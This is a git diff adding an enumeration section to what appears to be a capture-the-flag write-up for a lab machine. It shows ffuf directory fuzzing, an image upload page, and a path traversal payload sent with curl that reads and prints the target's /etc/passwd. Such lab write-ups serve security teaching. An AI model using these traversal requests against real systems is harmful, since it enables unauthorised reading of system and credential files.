@@ -79,6 +79,129 @@ From our scan we have 2 opened ports, port 22 which runs ssh and port 8080 which
 
 
 
+<h2>Enumeration</h2>
+
+Going to the webpage should give you this
+
+![image](https://user-images.githubusercontent.com/67879936/224516432-f01c444f-ae09-4135-8454-550989326662.png)
+
+Lets go ahead and fuzz for hidden directories
+
+>command: ffuf -u "http://10.129.178.127:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~]
+└─$ ffuf -u "http://10.129.178.127:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.178.127:8080/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .zip .sql .php .phtml .bak .backup 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 200, Size: 6657, Words: 1785, Lines: 166, Duration: 511ms]
+blogs                   [Status: 200, Size: 5371, Words: 1861, Lines: 113, Duration: 260ms]
+environment             [Status: 500, Size: 712, Words: 27, Lines: 1, Duration: 384ms]
+error                   [Status: 500, Size: 106, Words: 3, Lines: 1, Duration: 153ms]
+register                [Status: 200, Size: 5654, Words: 1053, Lines: 104, Duration: 685ms]
+upload                  [Status: 200, Size: 1857, Words: 513, Lines: 54, Duration: 186ms]
+:: Progress: [32298/32298] :: Job [1/1] :: 231 req/sec :: Duration: [0:03:05] :: Errors: 0 ::
+```
+Lets go to the _**/upload**_ directory
+
+![image](https://user-images.githubusercontent.com/67879936/224517290-b02c8e4f-1da7-4a4a-ae03-f42e9ecadad2.png)
+
+Lets try to upload an image file
+
+![image](https://user-images.githubusercontent.com/67879936/224517311-ee677fda-6d33-416f-b905-732858adc603.png)
+
+Now les click on the "view your imaage", you should have this
+
+![image](https://user-images.githubusercontent.com/67879936/224517346-9755de93-5714-443f-8d1d-9309b3ed2ee0.png)
+
+Observer the url there, lets try path transversal here
+
+Link:http://10.129.178.127:8080/show_image?img=../../../../../../etc/passwd
+
+We'll be using curl to run this
+
+>command: curl -s http://10.129.178.127:8080/show_image?img=../../../../../../etc/passwd
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~]
+└─$ curl -s http://10.129.178.127:8080/show_image?img=../../../../../../etc/passwd             
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+frank:x:1000:1000:frank:/home/frank:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+phil:x:1001:1001::/home/phil:/bin/bash
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+_laurel:x:997:996::/var/log/laurel:/bin/false
+```
+cool, we can read the ```/etc/passwd``` file.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
